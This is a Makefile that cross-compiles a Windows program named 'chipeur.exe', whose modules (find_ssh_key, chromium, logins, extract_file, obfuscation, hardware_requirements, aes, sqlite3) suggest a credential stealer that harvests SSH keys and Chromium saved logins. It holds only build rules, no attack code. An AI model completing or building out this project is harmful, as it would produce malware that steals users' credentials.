#Directories used
SRC_DIR = src/
INCLUDE_DIR = include/
OBJ_DIR = obj/

# add the object file used here
OBJ_FILES=$(OBJ_DIR)chipeur.o $(OBJ_DIR)find_ssh_key.o $(OBJ_DIR)extract_file.o $(OBJ_DIR)obfuscation.o  $(OBJ_DIR)chromium.o $(OBJ_DIR)path.o $(OBJ_DIR)logins.o $(OBJ_DIR)hardware_requirements.o $(OBJ_DIR)sqlite3.o $(OBJ_DIR)aes.o

CC=x86_64-w64-mingw32-gcc
CFLAGS=-g -fPIE -O2 -s -Warray-bounds -Wsequence-point -Walloc-zero -Wnull-dereference \
    -Wpointer-arith -Wcast-qual -Wcast-align=strict -I$(INCLUDE_DIR)

#not needed for now
LDFLAGS =# -Wl,--strip-all
LLIB= -luuid -lole32 -lcrypt32
DEBUG=-DDEBUG

.PHONY : all help clean
all: chipeur.exe

#The following syntax to create object file:
#$(OBJ_DIR) file1.o : $(SRC_DIR) file1.c $(INCLUDE_DIR)\
    hdr_used1.h... $(INCLUDE_DIR)hdr_usedn.h
#$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@

#Create the object files
$(OBJ_DIR)chipeur.o: $(SRC_DIR)chipeur.c $(INCLUDE_DIR)chipeur.h $(INCLUDE_DIR)find_ssh_key.h
	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)find_ssh_key.o : $(SRC_DIR)find_ssh_key.c $(INCLUDE_DIR)find_ssh_key.h $(INCLUDE_DIR)extract_file.h
	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)extract_file.o: $(SRC_DIR)extract_file.c $(INCLUDE_DIR)extract_file.h
	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)obfuscation.o: $(SRC_DIR)obfuscation.c $(INCLUDE_DIR)obfuscation.h
	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)chromium.o : $(SRC_DIR)chromium.c $(INCLUDE_DIR)chromium.h
	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)path.o : $(SRC_DIR)path.c $(INCLUDE_DIR)path.h
	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)logins.o : $(SRC_DIR)logins.c $(INCLUDE_DIR)logins.h
	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)hardware_requirements.o : $(SRC_DIR)hardware_requirements.c $(INCLUDE_DIR)hardware_requirements.h
	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)sqlite3.o : $(SRC_DIR)sqlite3.c $(INCLUDE_DIR)sqlite3.h
	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)aes.o : $(SRC_DIR)aes.c $(INCLUDE_DIR)aes.h
	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@

#make the binary
chipeur.exe: $(OBJ_FILES) 
	$(CC) $(CFLAGS) $(LDFLAGS) $^ -o $@ $(LLIB)

clean:
	rm -fv $(OBJ_DIR)* chipeur.exe chipeur

help: 
    @echo "chipeur:\tto create the binary of the project" 
    @echo "clean:\tto remove the binary and .o files" 
    @echo "help:\tto display this help"
